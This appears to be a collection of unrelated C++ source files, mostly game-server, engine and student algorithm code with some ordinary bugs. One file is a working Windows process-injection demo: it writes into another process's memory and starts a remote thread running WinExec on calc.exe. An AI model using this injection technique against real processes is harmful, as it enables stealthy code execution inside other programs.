boss_sulfuronAI : public BossAI\n        {\n            boss_sulfuronAI(Creature* creature) : BossAI(creature, BOSS_SULFURON_HARBINGER)\n            {\n            }\n\n            void EnterCombat(Unit* victim)\n            {\n                BossAI::EnterCombat(victim);\n                events.RescheduleEvent(EVENT_DARK_STRIKE, 10000);\n                events.RescheduleEvent(EVENT_DEMORALIZING_SHOUT, 15000);\n                events.RescheduleEvent(EVENT_INSPIRE, 13000);\n                events.RescheduleEvent(EVENT_KNOCKDOWN, 6000);\n                events.RescheduleEvent(EVENT_FLAMESPEAR, 2000);\n            }\n\n            void UpdateAI(uint32 diff)\n            {\n                if (!UpdateVictim())\n                    return;\n\n                events.Update(diff);\n\n                if (me->HasUnitState(UNIT_STATE_CASTING))\n                    return;\n\n                if (uint32 eventId = events.ExecuteEvent())\n                {\n                    switch (eventId)\n                    {\n                        case EVENT_DARK_STRIKE:\n                            DoCast(me, SPELL_DARK_STRIKE);\n                            events.RescheduleEvent(EVENT_DARK_STRIKE, urand(15000, 18000));\n                            break;\n                        case EVENT_DEMORALIZING_SHOUT:\n                            DoCastVictim(SPELL_DEMORALIZING_SHOUT);\n                            events.RescheduleEvent(EVENT_DEMORALIZING_SHOUT, urand(15000, 20000));\n                            break;\n                        case EVENT_INSPIRE:\n                        {\n                            std::list<Creature*> healers = DoFindFriendlyMissingBuff(45.0f, SPELL_INSPIRE);\n                            if (!healers.empty())\n                                DoCast(Trinity::Containers::SelectRandomContainerElement(healers), SPELL_INSPIRE);\n\n                            DoCast(me, SPELL_INSPIRE);\n                            events.RescheduleEvent(EVENT_INSPIRE, urand(20000, 26000));\n                            break;\n                        }\n                        case EVENT_KNOCKDOWN:\n                            DoCastVictim(SPELL_KNOCKDOWN);\n                            events.RescheduleEvent(EVENT_KNOCKDOWN, urand(12000, 15000));\n                            break;\n                        case EVENT_FLAMESPEAR:\n                            if (Unit* target = SelectTarget(SELECT_TARGET_RANDOM, 0, 0.0f, true))\n                                DoCast(target, SPELL_FLAMESPEAR);\n                            events.RescheduleEvent(EVENT_FLAMESPEAR, urand(12000, 16000));\n                            break;\n                        default:\n                            break;\n                    }\n                }\n\n                DoMeleeAttackIfReady();\n            }\n        };\n\n        CreatureAI* GetAI(Creature* creature) const\n        {\n            return new boss_sulfuronAI(creature);\n        }\n};\n\nclass mob_flamewaker_priest : public CreatureScript\n{\n    public:\n        mob_flamewaker_priest() : CreatureScript(\"mob_flamewaker_priest\") { }\n\n        struct mob_flamewaker_priestAI : public ScriptedAI\n        {\n            mob_flamew",
    "#include <iostream>\n#include <fstream>\nusing namespace std;\n\nvoid swap(int values[], int i, int j){\n    /*\n    Troca dois valores de posi\u00e7ao em um array\n    param: int values[] - vetor de elementos\n    param: int i - primeiro elemento\n    param: int j - segundo elemento\n    */\n    int aux = values[j];\n    values[j] = values[i];\n    values[i] = aux;\n}\n\n\nint pickPivoIndex(int values[], int left, int right){\n    /*\n    Seleciona a mediana de 3 valores de uma lista\n    param: int values[] - vetor de elementos\n    param: int left - indice do elemento mais a direita\n    param: int right - indice do elemento mais a esquerda\n    return: mediana\n    */\n    int mid = (left+right)/2;\n    if((values[left] > values[mid]) != (values[left] > values[right])){\n        return left;\n    }\n    else if((values[mid] > values[left]) != (values[mid] > values[right])){\n        return mid;\n    }\n    else {\n        return right;\n    }\n}\n\n\nint partition(int values[], int left, int right, bool order){\n    /*\n    Seleciona um pivo\n    Ordena os elementos menores que o pivo a esquerda e os maiores a direita\n    param: int values[] - vetor de elementos\n    param: int left - indice do elemento mais a direita\n    param: int right - indice do elemento mais a esquerda\n    param: int order - ordem de ordena\u00e7\u00e3o do array, menores a direita ou a esquerda\n    return: indice pivo\n    */\n    int index_pivo = pickPivoIndex(values, left, right);\n    \n    int pivo = values[index_pivo];\n    swap(values, left, index_pivo);\n    index_pivo = left;\n\n    for (int i = left+1; i<=right; i++){\n        if (values[i] <= pivo == order){\n            ++index_pivo;\n            swap(values, i, index_pivo);       \n        }\n    }\n    swap(values, left, index_pivo);\n    return index_pivo;\n}\n\n\nvoid quick_sort(int values[], int left, int right, bool order = 0){\n    /*\n    Ordena um vetor com elementos inteiros\n    param: int values[] - vetor de elementos para ordena\u00e7\u00e3o\n    param: int left - indice do elemento mais a direita\n    param: int right - indice do elemento mais a esquerda\n    param: int order - ordem de ordena\u00e7\u00e3o do array (crescente/decrescente) - default=True crescente\n    */\n    if (left < right){\n        int index_pivo = partition(values, left, right, order);\n        quick_sort(values, left, index_pivo-1);\n        quick_sort(values, index_pivo+1, right);\n    }\n}\n\n\nint main(){\n    int values[100];\n    ifstream dados;\n   \n    dados.open(\"./dados.txt\");\n    for (int i = 0; !dados.eof(); i++){\n        dados >> values[i];\n    }\n    dados.close();\n\n    int tm_v = sizeof(values)/sizeof(values[0])-1;\n    \n    quick_sort(values, 0, tm_v);\n\n    for(int i = 0; i<=tm_v; i++){\n        cout << values[i] << \", \";\n    }\n    cout << '\\n';\n\n}",
    "\ufeff// DataPlay.cpp : Defines the entry point for the application.\n//\n\n#include \"DataPlay.h\"\n#include <cstdlib>\n\nusing namespace std;\n\n#include <json/json.h>\n#include <fstream>\n#include <string>\n#include <algorithm>\n#include <ctime>\n#include <random>\n\n/*\nReads specified json file into a data structure,\noptionally avoiding duplicates in field such as \"name\".\nThen, performs data access and algorithms, such as:\n\t- randomly selcting a subsset of unique elements\n*/\nint main(int argc, char* argv[])\n{\n\t// 1. parse commandline\n\tstd::string filename;\n\tstd::string uniqueKey;\n\tstd::string filterKey;\n\tint filterValue = 0;\n\tbool containsMatch = false;\n\tbool caseMatch = false;\n\tbool checkForDuplicates = !uniqueKey.empty();\n\tbool filter = false;\n\n\t// some options to set \n\tint options = 1;\n\tfor (int i = 1; i < argc; ++i) {\n\t\tstd::string arg = argv[i];\n\t\tif (arg == \"-file\") {\n\t\t\tif (i + 1 < argc)\n\t\t\t\tfilename = argv[++i];\n\t\t\tcout << \"Importing data from \" << filename << endl;\n\t\t}\n\t\telse if (arg == \"-choices\") {\n\t\t\tif (i + 1 < argc)\n\t\t\t\toptions = std::stoi(argv[++i]);\n\t\t\tcout << \"Selecting \" << options << \" random choices.\" << endl;\n\t\t}\n\t\telse if (arg == \"-noduplicates\") {\n\t\t\tcheckForDuplicates = true;\n\t\t\tif (i + 1 < argc)\n\t\t\t\tuniqueKey = argv[++i];\n\t\t\tcout << \"Avoiding duplicate keys \" << uniqueKey << \".\" << endl;\n\t\t}\n\t\telse if (arg == \"-ignorecase\") {\n\t\t\tcaseMatch = true;\n\t\t}\n\t\telse if (arg == \"-contains\") {\n\t\t\tcontainsMatch = true;\n\t\t}\n\t\telse if (arg == \"-filter\") {\n\t\t\tfilter = true;\n\t\t\tif (i + 1 < argc)\n\t\t\t\tfilterKey = argv[++i];\n\t\t\tif (i + 1 < argc)\n\t\t\t\tfilterValue = std::stoi(argv[++i]);\n\t\t\tuniqueKey = argv[3];\n\t\t\tcout << \"Filtering key \" << filterKey << \" = \" << filterValue << endl;\n\t\t}\t\t\n\t}\n\tif (filename.empty()) {\n\t\tcout << \"Please specify file to parse. Using default Data\\\\data.json\" << endl;\n\t\tfilename = \"..\\\\..\\\\..\\\\Data\\\\data.json\";\n\t}\n\n\t// 2. Load json file into root value\n\tJson::Value root;\n\tstd::ifstream ifs;\n\tifs.open(filename);\n\t\n\tJson::CharReaderBuilder builder;\n\tbuilder[\"collectComments\"] = true;\n\tJSONCPP_STRING errs;\n\tif (!parseFromStream(builder, ifs, &root, &errs)) {\n\t\tcout << errs << endl;\n\t\treturn EXIT_FAILURE;\n\t}\n\n\t// 3. Iterate over json structure and insert into vector\n\tstd::vector <Json::Value> items;\n\n\tfor (Json::Value::iterator it = root.begin(); it != root.end(); ++it) {\n\t\tJson::Value newval = *it;\n\t\tbool found = false;\n\n\t\tif (filter && newval[filterKey].asInt() != filterValue) continue;\n\n\t\tif (checkForDuplicates && newval[uniqueKey].isNull()) {\n\t\t\tcout << \"Key \" << uniqueKey << \" doesn't exist.\" << endl;\n\t\t\tcheckForDuplicates = false;\n\t\t}\n\t\tif (checkForDuplicates) {\n\t\t\tstd::string newstr = newval[uniqueKey].asString();\n\t\t\tif (caseMatch)\n\t\t\t\tstd::transform(newstr.begin(), newstr.end(), newstr.begin(), std::tolower);\n\n\t\t\tfor (std::vector<Json::Value>::iterator it2 = items.begin(); it2 != items.end(); ++it2) {\n\t\t\t\tJson::Value val2 = *it2;\n\t\t\t\tstd::string str2 = val2[uniqueKey].asString();\n\n\t\t\t\tif (caseMatch)\n\t\t\t\t\tstd::transform(str2.begin(), str2.end(), str2.begin(), std::tolower);\n\n\t\t\t\tif (str2 == newstr\n\t\t\t\t\t|| containsMatch \n\t\t\t\t\t&& (str2.find(newstr) != std::string::npos || newstr.find(str2) != std::string::npos)) {\n\t\t\t\t\tcout << \"DUPLICATE ENTRY:  \" << newval[uniqueKey] << \" \" << val2[uniqueKey] << endl;\n\t\t\t\t\tfound = true;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tif (!found)\n\t\t\titems.push_back(*it);\n\t}\n\n\t// 4. Perform random selection\n\tJson::Value selection;\n\tif(options > items.size()) options = static_cast<int>(items.size());\n\n\tstd::random_device rd; // Seed source for the random number engine\n\tstd::mt19937 gen(rd()); // Mersenne Twister engine seeded with rd()\n\n\tfor (int i = 0; i < options; i++) { \n\t\tstd::uniform_int_distribution<> distrib(0, static_cast<int>(items.size()) - 1);\n\t\tint index = distrib(gen);\n\t\tselection[i] = items[index];\n\t\titems.erase(items.begin() + index);\n\t}\n\tcout << selection << endl;\n\treturn EXIT_SUCCESS;\n}",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\r\n\r\n\r\n#include \"AsyncReadDataGatherListFromFile.h\"\r\n#include \"QingLongXia/GeneralBlueprintFunctionLibrary.h\"\r\n#include \"QingLongXia/DataInterface/PlaybackDataConvert.h\"\r\n\r\nUAsyncReadDataGatherListFromFile::UAsyncReadDataGatherListFromFile(const FObjectInitializer& ObjectInitializer)\r\n{\r\n\tFileName = TEXT(\"\");\r\n}\r\n\r\nvoid UAsyncReadDataGatherListFromFile::SetReadyToDestroy()\r\n{\r\n\tSuper::SetReadyToDestroy();\r\n\tUE_LOG(LogTemp, Log, TEXT(\"%hs %s\"), __FUNCTION__, TEXT(\"GC !\"));\r\n}\r\n\r\nUAsyncReadDataGatherListFromFile* UAsyncReadDataGatherListFromFile::AsyncReadDataGatherListFromFile(UObject* WorldContextObject, const FString& InFileName)\r\n{\r\n\tUAsyncReadDataGatherListFromFile* SaveDataGatherListToFileObject = NewObject<UAsyncReadDataGatherListFromFile>();\r\n\tSaveDataGatherListToFileObject->FileName = InFileName;\r\n\tSaveDataGatherListToFileObject->RegisterWithGameInstance(WorldContextObject);\r\n\treturn SaveDataGatherListToFileObject;\r\n}\r\n\r\nvoid UAsyncReadDataGatherListFromFile::Activate()\r\n{\r\n\tSuper::Activate();\r\n\r\n\tAsyncTask(ENamedThreads::AnyBackgroundThreadNormalTask, [this]()\r\n\t{\r\n\t\tif (FPaths::FileExists(FileName))\r\n\t\t{\r\n\t\t\tFString TempString = TEXT(\"\");\r\n\t\t\tbool bSuccess = FFileHelper::LoadFileToString(TempString, *FileName);\r\n\r\n\t\t\tFDataGatherList TempDataGatherList = FDataGatherList();\r\n\r\n\t\t\t// std::string TempStdString = UPlaybackDataConvert::FStringToStdString(TempString);\r\n\t\t\t// Playback_Data::DataGatherList TempDataGatherList44;\r\n\t\t\t// TempDataGatherList44.ParseFromString(TempStdString);\r\n\t\t\t// for (Playback_Data::TimeAndDataGather Element : TempDataGatherList44.timeanddatagatherarray())\r\n\t\t\t// {\r\n\t\t\t// \tTempDataGatherList.TimeAndDataGatherArray.Add(UPlaybackDataConvert::ConvertProtobufTimeAndDataGatherToFTimeAndDataGather(Element));\r\n\t\t\t// }\r\n\t\t\t\r\n\t\t\tbool bSuccess1 = UGeneralBlueprintFunctionLibrary::LocalConvertJsonStringToStruct<FDataGatherList>(TempString, TempDataGatherList);\r\n\t\r\n\t\t\tAsyncTask(ENamedThreads::GameThread, [this, bSuccess, bSuccess1, TempDataGatherList]()\r\n\t\t\t{\r\n\t\t\t\tif (bSuccess && bSuccess1)\r\n\t\t\t\t{\r\n\t\t\t\t\tOnSuccess.Broadcast(TempDataGatherList);\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tOnFailed.Broadcast(FDataGatherList());\r\n\t\t\t\t}\r\n\t\r\n\t\t\t\tSetReadyToDestroy();\r\n\t\t\t});\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tAsyncTask(ENamedThreads::GameThread, [this]()\r\n\t\t\t{\r\n\t\t\t\tOnFailed.Broadcast(FDataGatherList());\r\n\t\t\t\tSetReadyToDestroy();\r\n\t\t\t});\r\n\t\t}\r\n\t});\r\n}\r\n\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"calculatorgit\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include \"Windows.h\"\r\n#include <iostream>\r\n\r\nint main(int argc, char* argv[])\r\n{\r\n    // \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c, \u0431\u044b\u043b \u043b\u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u043d PID\r\n    if (argc < 2) {\r\n        std::cout << \"Usage: \" << argv[0] << \" <PID>\" << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    HANDLE processHandle;\r\n    HANDLE remoteThread;\r\n    PVOID remoteBuffer;\r\n\r\n    // \u0418\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c cout \u0434\u043b\u044f \u0432\u044b\u0432\u043e\u0434\u0430 PID\r\n    std::cout << \"Injecting to PID: \" << atoi(argv[1]) << std::endl;\r\n\r\n    // \u041e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u043f\u0440\u043e\u0446\u0435\u0441\u0441 \u0441 \u043f\u043e\u043b\u043d\u044b\u043c \u0434\u043e\u0441\u0442\u0443\u043f\u043e\u043c\r\n    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));\r\n    if (processHandle == NULL) {\r\n        std::cerr << \"Failed to open process. Error: \" << GetLastError() << std::endl;\r\n        return 1;\r\n    }\r\n\r\n    // \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0430\u0434\u0440\u0435\u0441 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 WinExec \u0432 kernel32.dll\r\n    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"WinExec\");\r\n    if (loadLibraryAddr == NULL) {\r\n        std::cerr << \"Failed to get WinExec address. Error: \" << GetLastError() << std::endl;\r\n        CloseHandle(processHandle);\r\n        return 1;\r\n    }\r\n\r\n    // \u0412\u044b\u0434\u0435\u043b\u044f\u0435\u043c \u043f\u0430\u043c\u044f\u0442\u044c \u0432 \u0443\u0434\u0430\u043b\u0435\u043d\u043d\u043e\u043c \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u0435 \u0434\u043b\u044f \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u0430 \"calc.exe\"\r\n    remoteBuffer = VirtualAllocEx(processHandle, NULL, strlen(\"calc.exe\") + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\r\n    if (remoteBuffer == NULL) {\r\n        std::cerr << \"Failed to allocate memory in remote process. Error: \" << GetLastError() << std::endl;\r\n        CloseHandle(processHandle);\r\n        return 1;\r\n    }\r\n\r\n    // \u041f\u0438\u0448\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0443 \"calc.exe\" \u0432 \u0443\u0434\u0430\u043b\u0435\u043d\u043d\u044b\u0439 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\r\n    if (!WriteProcessMemory(processHandle, remoteBuffer, \"calc.exe\", strlen(\"calc.exe\") + 1, NULL)) {\r\n        std::cerr << \"Failed to write memory in remote process. Error: \" << GetLastError() << std::endl;\r\n        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);\r\n        CloseHandle(processHandle);\r\n        return 1;\r\n    }\r\n\r\n    // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0443\u0434\u0430\u043b\u0435\u043d\u043d\u044b\u0439 \u043f\u043e\u0442\u043e\u043a, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u0432\u044b\u0437\u044b\u0432\u0430\u0435\u0442 WinExec(\"calc.exe\", SW_SHOW)\r\n    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteBuffer, 0, NULL);\r\n    if (remoteThread == NULL) {\r\n        std::cerr << \"Failed to create remote thread. Error: \" << GetLastError() << std::endl;\r\n        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);\r\n        CloseHandle(processHandle);\r\n        return 1;\r\n    }\r\n\r\n    // \u0416\u0434\u0435\u043c \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u044f \u043f\u043e\u0442\u043e\u043a\u0430\r\n    WaitForSingleObject(remoteThread, INFINITE);\r\n\r\n    // \u041e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0430\u0435\u043c \u043f\u0430\u043c\u044f\u0442\u044c \u0438 \u0437\u0430\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0434\u0435\u0441\u043a\u0440\u0438\u043f\u0442\u043e\u0440\u044b\r\n    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);\r\n    CloseHandle(remoteThread);\r\n    CloseHandle(processHandle);\r\n\r\n    std::cout << \"Calculator launched in target process!\" << std::endl;\r\n\r\n    return 0;\r\n}\r\n",
    "// #include <iostream>\n#include <algorithm>\n#include <chrono>\n#include <cstdlib>\n#include <iostream>\n#include <limits>\n#include <ostream>\n#include <vector>\n\nusing namespace std;\n\nstruct Result {\n    int maxSum;\n    int left;\n    int right;\n};\n\nResult maxSum3Loops(vector<int>& arr) {\n    Result result;\n    result.maxSum = numeric_limits<int>::min();\n\n    for (int i = 0; i < arr.size(); ++i) {\n        for (int j = i; j < arr.size(); ++j) {\n            int thisSum = 0;\n\n            for (int k = i; k <= j; ++k) \n                thisSum += arr[k];\n\n            if (thisSum > result.maxSum) {\n                result.maxSum = thisSum;\n                result.left = i;\n                result.right = j;\n            }\n        }\n    }\n    return result;\n}\n\n\nResult maxSum2Loops(vector<int>& arr) {\n    Result result;\n    result.maxSum = numeric_limits<int>::min();\n\n    for (int i = 0; i < arr.size(); ++i) {\n        int thisSum = 0;\n        for (int j = i; j < arr.size(); j++) {\n            thisSum += arr[j];\n            if (result.maxSum < thisSum) {\n                result.maxSum = thisSum;\n                result.left = i;\n                result.right = j;\n            }\n        }\n    }\n    return result;\n}\n\n\nResult maxSumRecursive(vector<int>& arr, int left, int right) {\n    Result result;\n    \n    if (left == right) {\n        result.maxSum = arr[left];\n        result.left = left, result.right = left;\n        return result;\n    } \n\n    int center = (left+right) / 2;\n    Result maxLeftSum = maxSumRecursive(arr, left, center);\n    Result maxRightSum = maxSumRecursive(arr, center+1, right);\n\n    int maxLeftBorderSum = numeric_limits<int>::min();\n    int leftBorderSum = 0;\n    for (int i = center; i >= left; --i) {\n        leftBorderSum += arr[i];\n        if (leftBorderSum > maxLeftBorderSum) {\n            maxLeftBorderSum = leftBorderSum;\n            result.left = i;\n        }\n    }\n\n    int maxRightBorderSum = numeric_limits<int>::min();\n    int rightBorderSum = 0;\n    for (int j = center; j <= right; ++j) {\n        rightBorderSum += arr[j];\n        if (rightBorderSum > maxRightBorderSum) {\n            maxRightBorderSum = rightBorderSum;\n            result.right = j;\n        }\n    }\n\n    int maxBorderSum = maxLeftBorderSum+maxRightBorderSum;\n\n    if (maxBorderSum > max(maxLeftSum.maxSum, maxRightSum.maxSum)) {\n        result.maxSum = maxBorderSum;\n        return result;\n    } \n    else {\n        return (maxLeftSum.maxSum > maxRightSum.maxSum) ? maxLeftSum : maxRightSum;\n    }\n}\n\nResult maxSumDP(vector<int>& arr) {\n    Result result;\n    result.maxSum = arr[0];\n    result.left = 0, result.right = 0;\n    \n    Result current;\n    current.maxSum = arr[0];\n    current.left = 0, current.right = 0;    \n\n    for (int i = 0; i < arr.size(); ++i) {\n        if (arr[i] > current.maxSum+arr[i]) {\n            current.left = i, current.right = i;\n            current.maxSum = arr[i];\n        }\n        else {\n            current.maxSum += arr[i];\n            current.right = i;\n        }\n\n        if (current.maxSum >= result.maxSum) {\n            result = current;\n        }\n    }\n    return result;\n}\n\n\n// Driver code\nint main() {\n    vector<int> positives(1000);\n    vector<int> negatives(1000);\n\n    for (int i = 0; i < positives.size(); ++i) {\n        positives[i] = rand() % 10000;\n        negatives[i] = (rand() % 10000) * -1;\n    }\n\n    Result resPositive, resNegative;\n    chrono::time_point start = chrono::high_resolution_clock::now();\n    chrono::time_point end = chrono::high_resolution_clock::now();\n    chrono::duration<double> elapsed;\n\n    start = chrono::high_resolution_clock::now();  \n    resPositive = maxSum3Loops(positives);\n    resNegative = maxSum3Loops(negatives);\n    end = chrono::high_resolution_clock::now();\n    elapsed = end - start;\n    std::cout << \"\\nTime taken (Algorithm #1): \" << elapsed.count() * 1000 << \"\\tmiliseconds\" << std::endl;\n\n\n    start = chrono::high_resolution_clock::now();\n    resPositive = maxSum2Loops(positives);\n    resNegative = maxSum2Loops(negatives);\n    end = chrono::high_resolution_clock::now();\n    elapsed = end - start;\n    std::cout << \"Time taken (Algorithm #2): \" << elapsed.count() * 1000 << \"\\tmiliseconds\" << std::endl;\n    \n    start = chrono::high_resolution_clock::now();\n    resPositive = maxSumRecursive(positives, 0, positives.size()-1);\n    resNegative = maxSumRecursive(negatives, 0, negatives.size()-1);\n    end = chrono::high_resolution_clock::now();\n    elapsed = end - start;\n    std::cout << \"Time taken (Algorithm #3): \" << elapsed.count() * 1000 << \"\\tmiliseconds\" << std::endl;\n    \n    start = chrono::high_resolution_clock::now();\n    resPositive = maxSumDP(positives);\n    resNegative = maxSumDP(negatives);\n    end = chrono::high_resolution_clock::now();\n    elapsed = end - start;\n    std::cout << \"Time taken (Algorithm #4): \" << elapsed.count() * 1000 << \"\\tmiliseconds\" << std::endl;\n    \n    return 0;\n}\n",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\nbool search(int **arr, int r, int c, int t) // usie it if array is sorted otherwise firstly sort the array\r\n{\r\n    int s = 0;\r\n    int e = r * c - 1;\r\n\r\n    while (s <= e)\r\n    {\r\n        int mid = s + (e - s) / 2;\r\n        if (arr[mid / c][mid % c] == t)\r\n        {\r\n            return true;\r\n        }\r\n        else if (arr[mid / c][mid % c] < t)\r\n        {\r\n            s = mid + 1;\r\n        }\r\n        else\r\n        {\r\n            e = mid - 1;\r\n        }\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nbool search1(int **arr, int r, int c, int t)\r\n{\r\n    for (int i = 0; i < r; i++)\r\n    {\r\n        for (int j = 0; j < c; j++)\r\n        {\r\n            if (arr[i][j] == t)\r\n            {\r\n                return true;\r\n            }\r\n        }\r\n    }\r\n    return false;\r\n}\r\n\r\nint main()\r\n{\r\n    int r, c;\r\n    cout << \"Enter the value of row and column: \";\r\n    cin >> r >> c;\r\n    int **arr = new int *[r];\r\n    for (int i = 0; i < r; i++)\r\n    {\r\n        arr[i] = new int[c];\r\n    }\r\n\r\n    for (int i = 0; i < r; i++)\r\n    {\r\n        for (int j = 0; j < c; j++)\r\n        {\r\n            cin >> arr[i][j];\r\n        }\r\n    }\r\n\r\n    int target;\r\n    cout << \"Enter the value you want to search: \";\r\n    cin >> target;\r\n\r\n    if (search1(arr, r, c, target))\r\n    {\r\n        cout << \"Element found\" << endl;\r\n    }\r\n    else\r\n    {\r\n        cout << \"Element not found\" << endl;\r\n    }\r\n}",
    "#include<bits/stdc++.h>\nusing namespace std;\n\n//vector <dataType> name_Vector;    -> 1 mang dong\n\n//Method\n//push_back() -> day ve sau O(1)\n\t\t\t//-> tu tang size len 1\n//pop_back() ->xoa phan tu sau cung O(1)\n\t\t\t//-> giam size 1 don vi \n//size()\t->tra ve kich thuoc cua vector\n//back()\t-> tra ve value cua gia tri cuoi cung cua vector\n//front()\t->tra ve value dau tien cua vector\n//erase() -> xoa 1 phan tu trong vector voi tham so la 1 iterator O(N)\n//insert() -> them 1 phan tu o vi tri bat ki (iterator,value)\tO(N)\n//clear() -> xoa vector\n//swap()  -> hoan doi 2 value cua vector v1.swap(v2)\n\n//Duyet qua index,forEach\n//Duyet qua iterator: hoat dong giong con tro tro den 1 phan tu nao do trong vector:\n//\t\t\t\t\t -> begin(): vi tri dau tien\n//\t\t\t\t\t -> end(): vi tri sau phan tu cuoi cung\n//\t\t\t\t\t ->rbegin():vi tri cuoi cung \n\n// :: -> toan tu pham vi\n// *  -> toan tu giai pham chieu\n// &   -> tham chieu\nvoid Remove(vector<int> &v,int value){\n//\tint temp = -1;\n//\tfor(int i=0;i<v.size();i++){\n//\t\tif(v[i]==value){\n//\t\t\ttemp=i;\n//\t\t\tbreak;\n//\t\t}\n//\t}\n//\tif(temp!=-1){\n//\t\tfor(int i=temp;i<v.size();i++){\n//\t\t\tv[i]=v[i+1];\n//\t\t}\n//\t\tv.pop_back();\n//\t\tRemove(v,value);\n//\t}\n\n\tfor(vector<int>::iterator it = v.begin();it<v.end();it++){\n\t\tif(*it==value){\n\t\t\tv.erase(it);\n\t\t}\n\t}\n}\n\nint main(){\n//\tvector <int> v;\n//\tv.push_back(10);\n//\tv.push_back(20);\n//\tv.push_back(30);\n//\tcout<<v.size()<<endl;\n//\tcout<<\"Phan tu dau tien cua vector: \"<<v[0]<<endl;\n//\tcout<<\"Phan tu cuoi cung cua vector: \"<<v[v.size()-1]<<endl;\n//\tcout<<\"Phan tu cuoi cung cua vector: \"<<v.back()<<endl;\n//\t\n//\tfor(int i=0;i<v.size();i++){\n//\t\tcout<<v[i]<<\" \";\n//\t}\n//\tcout<<endl;\n//\tfor(int x : v){\n//\t\tcout<<x<<\" \";\n//\t}\n//\tcout<<endl;\n//\t\n//\tfor(vector<int>::iterator it = v.begin();it!=v.end();++it){\n//\t\tcout<<*it<<\" \";\n//\t}\n//\tcout<<endl;\n//\t\n//\t\n//\tint n;\n//\tcout<<\"Nhap n: \";\n//\tcin>>n;\n//\tvector<int> V(n);// Khai bao vector V co n phan tu  ,<=> V[n]\n//\tfor(int i=0;i<n;i++){\n//\t\tcin>>V[i];\n//\t}\n//\tfor(int x: V){\n//\t\tcout<<x<<\" \";\n//\t}\n//\tcout<<\"Befor Size: \"<<V.size()<<endl;\n//\tV.push_back(6);\n//\tcout<<\"After Size: \"<<V.size()<<endl;\n//\tcout<<endl;\n//\t\n//\t\n//\tvector<int> V1(n,100);\n//\tfor(int x:V1){\n//\t\tcout<<x<<\" \";\n//\t}\n//\tcout<<endl;\n//\tcout<<\"Befor Size: \"<<V1.size()<<endl;\n//\tV1.push_back(100);\n//\tcout<<\"After Size: \"<<V1.size()<<endl;\n\tint n;\n\tcout<<\"Xin moi nhap mang co so phan tu : \";\n\tcin>>n;\n\tvector<int> v;\n\tfor(int i=0;i<n;i++){\n\t\tint temp;cin>>temp;\n\t\tv.push_back(temp);\n\t}\n\tcout<<\"Phan tu ban muon xoa la: \";\n\tint remove;\n\tcin>>remove;\n\tRemove(v,remove);\n\tcout<<\"Mang sau khi xoa phan tu nay la: \";\n\tfor(int x: v){\n\t\tcout<<x<<\" \";\n\t}\n\tcout<<endl;\n\t\n\treturn 0;\n\t\t\n}\n",
